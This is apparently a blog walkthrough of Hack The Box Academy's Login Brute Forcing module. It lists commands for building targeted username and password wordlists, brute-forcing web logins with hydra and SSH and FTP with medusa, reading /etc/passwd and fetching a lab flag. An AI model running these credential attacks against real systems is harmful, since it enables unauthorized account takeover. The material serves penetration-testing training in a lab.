---
layout: post
title:  "Hack The Box - Academy - Login Brute Forcing"
description: "Explore this detailed walkthrough of Hack The Box Academy's Login Brute Forcing module. Learn effective techniques to perform login brute-force attacks, discover common vulnerabilities, and elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-10-26 10:51
image:  /images/htb/login-brute-forcing/logo.png
tags:   [authentication,cbbh,brute-forcing]
categories: [htbacademy]
---

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/details/57">Login Brute Forcing</a><br/>
<a href="https://jacozwarts.github.io/images/htb/login-brute-forcing/Login_Brute_Forcing_Module_Cheat_Sheet.pdf">Login Brute Forcing - Cheat Sheet</a><br/>
<a href="https://academy.hackthebox.com/module/57/section/504">Hydra - Cheat Sheet</a><br/>

<br/>

### Notes:
#### Command to match passwords with min requirements using grep:

```
grep -E '^.{8,}$' {TEXTFILE.txt} > {RESULTS.txt}
```

#### Custom Wordlists:
```
sudo apt install ruby -y
```
```
git clone https://github.com/urbanadventurer/username-anarchy.git
```
`Use username-anarchy to generate possible usernames:`
```
./username-anarchy Jan van Zyl > jan_van_zyl_usernames.txt
```

![username-anarchy result](/images/htb/login-brute-forcing/username-anarchy-result.png)

`Install cupp`:
```
sudo apt install cupp -y
```
```
cupp -i
```

`Grep command to filter passwords to meet min requirements:`
```
grep -E '^.{6,}$' jan_van_zyl.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jan_van_zyl-filtered.txt
```
`Hydra post example:`
```
hydra -L jan_van_zyl_usernames.txt -P jan_van_zyl-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
<hr/>

## Skills Assessment
><b>Overview:</b>
The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

### Part 1: What is the password for the basic auth login?

```
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt {TARGET_IP} http-get / -s {TARGET_PORT}
```

### Part 2: What is the username of the ftp user you find via brute-forcing?

#### Bruteforce ssh using medusa

```
medusa -h {TARGET_IP} -n {TARGET_PORT} -u {PART1_USERNAME} -P /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt -M ssh -t 3
```

`Connect to ssh`
```
ssh {ssh_username}@{TARGET_IP} -p {TARGET_PORT}
```

To find the username I investigated the `/etc/passwd` file.

#### Bruteforce ftp using medusa:
```
medusa -h 127.0.0.1 -u {USERNAME} -P {PASSWORD_WORDLIST} -M ftp -t 5
```
`Note use the password.txt file found on the box.`

### Part 2: What is the flag contained within flag.txt

#### Connect to ftp:
```
ftp ftp://{USERNAME}:{PASSWORD}@{SERVER}
```

#### Download flag.txt
```
get <remote-file-path> <local-file-path>
```
<hr/>